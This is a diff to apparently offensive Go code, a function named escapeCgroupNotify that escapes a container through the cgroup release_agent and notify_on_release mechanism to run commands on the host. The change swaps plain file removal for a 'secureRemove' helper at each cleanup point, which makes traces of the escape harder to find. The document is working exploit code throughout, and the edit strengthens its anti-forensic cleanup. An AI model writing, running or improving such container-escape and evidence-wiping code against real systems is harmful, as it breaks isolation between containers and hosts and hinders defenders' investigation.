@@ -377,7 +377,7 @@ func escapeCgroupNotify(command string) (string, string) {
 
 	outputFile, err := os.CreateTemp("", "")
 	if err != nil {
-		os.Remove(scriptPath)
+		secureRemove(scriptPath)
 		_ = syscall.Unmount(cgroupDir, 0)
 		os.RemoveAll(cgroupDir)
 		return fmt.Sprintf("Failed to create output temp file: %v", err), "error"
@@ -404,7 +404,7 @@ func escapeCgroupNotify(command string) (string, string) {
 	// Set release_agent
 	releaseAgentPath := filepath.Join(cgroupDir, "release_agent")
 	if err := os.WriteFile(releaseAgentPath, []byte(releaseAgentScript), 0o644); err != nil {
-		os.Remove(scriptPath)
+		secureRemove(scriptPath)
 		_ = syscall.Unmount(cgroupDir, 0)
 		os.RemoveAll(cgroupDir)
 		return fmt.Sprintf("Failed to set release_agent: %v", err), "error"
@@ -414,7 +414,7 @@ func escapeCgroupNotify(command string) (string, string) {
 	// Enable notify_on_release
 	notifyPath := filepath.Join(childDir, "notify_on_release")
 	if err := os.WriteFile(notifyPath, []byte("1"), 0o644); err != nil {
-		os.Remove(scriptPath)
+		secureRemove(scriptPath)
 		_ = syscall.Unmount(cgroupDir, 0)
 		os.RemoveAll(cgroupDir)
 		return fmt.Sprintf("Failed to enable notify_on_release: %v", err), "error"
@@ -435,14 +435,14 @@ func escapeCgroupNotify(command string) (string, string) {
 	if data, err := os.ReadFile(outputPath); err == nil {
 		sb.WriteString("\n--- Output ---\n")
 		sb.WriteString(string(data))
-		os.Remove(outputPath)
+		secureRemove(outputPath)
 	} else {
 		sb.WriteString("[!] No output file — release_agent may not have fired (host path resolution issue)\n")
 		sb.WriteString("    This technique requires the script path to be valid on the host filesystem\n")
 	}
 
 	// Cleanup
-	os.Remove(scriptPath)
+	secureRemove(scriptPath)
 	_ = syscall.Unmount(cgroupDir, 0)
 	os.RemoveAll(cgroupDir)
 
